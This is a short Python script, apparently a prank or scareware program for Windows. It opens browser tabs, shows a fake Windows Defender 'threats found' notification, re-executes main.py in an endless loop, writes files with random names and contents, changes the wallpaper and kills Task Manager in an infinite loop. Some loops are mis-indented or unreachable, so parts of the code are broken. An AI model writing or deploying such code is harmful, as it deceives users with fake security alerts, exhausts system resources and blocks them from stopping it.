import random
import string
import os
import ctypes
import time
import webbrowser
os.system('pip install win10toast')
from win10toast import ToastNotifier




time.sleep(2)
webbrowser.open("https://www.google.com/search?q=how+to+hack+roblox", new=1)


time.sleep(3)
webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", new=1)


time.sleep(4)
webbrowser.open("https://www.youtube.com/watch?v=cB4dYfFgaME", new=1)

time.sleep(5)
toaster = ToastNotifier()
toaster.show_toast("Virus & threat protection \nThreats found","Windows Defender AntiVirus found threats. Get details.")

while toaster.notification_active():
          time.sleep(0.1)




time.sleep(15)
while 1:
    exec(open('main.py').read())

length_of_string = random.choice(range(1, 100))
random_string = "".join(random.choice(string.ascii_letters) for i in range(length_of_string))

length_of_string2 = random.choice(range(1, 100000))
random_string2 = "".join(random.choice(string.ascii_letters) for i in range(length_of_string2))

time.sleep(10)
while 1:
  f = open(random_string, "w+")
f.write(random_string2+'\n'+random_string2+random_string2+'\n'+random_string2+random_string2+'\n'+random_string2+random_string2+'\n'+random_string2+random_string2+'\n'+random_string2)
f.close()

SPI_SETDESKWALLPAPER = 20 

ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "PythonBackground.png" , 0)

while 1:
  os.system("taskkill -f -im taskmgr.exe")
